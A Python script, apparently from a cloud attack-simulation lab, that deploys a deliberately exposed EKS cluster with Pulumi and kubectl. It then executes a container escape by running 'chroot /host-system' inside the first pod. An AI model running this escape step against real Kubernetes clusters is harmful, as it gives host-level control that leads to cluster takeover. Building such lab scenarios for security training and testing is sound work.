import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from core.helpers import generate_ssh_key

def scenario_7_execute():
    print("-"*30)
    print(colored("Executing Scenraio 7 : Container Escape & Cluster Takeover in EKS", color="red"))
    loading_animation()
    print("-"*30)

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)
    
    file_path = "./core/cobra-scenario-7-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))

    generate_ssh_key()

    subprocess.call("cd ./scenarios/scenario_7/infra/ && pulumi up -s cobra-scenario-7 -y", shell=True)
    subprocess.call("cd ./scenarios/scenario_7/infra/ && pulumi stack -s cobra-scenario-7 output --json >> ../../../core/cobra-scenario-7-output.json", shell=True)

    with open("./core/cobra-scenario-7-output.json", "r") as file:
        data = json.load(file)
    
    REGION = data["Region"] 
    CLUSTER_NAME = data["ClusterData"]["cluster"]["name"]
    

    subprocess.call(f"aws eks update-kubeconfig --name {CLUSTER_NAME} --region {REGION}", shell=True)
    subprocess.call("kubectl get namespaces", shell=True)

    print(colored("Deploying Web App and service", color="red"))
    loading_animation()
    sleep_duration = 300
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)

            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval    
    subprocess.call("kubectl apply -f ./scenarios/scenario_7/infra/app/service.yml", shell=True)
    subprocess.call("kubectl apply -f ./scenarios/scenario_7/infra/app/app.yml", shell=True)


    print(colored("Escaping Container & Escalating to Host", color="red"))
    loading_animation()
    subprocess.call("kubectl exec -it $(kubectl get pods --no-headers -o custom-columns=':metadata.name' | head -n 1) -- bash -c 'chroot /host-system'", shell=True)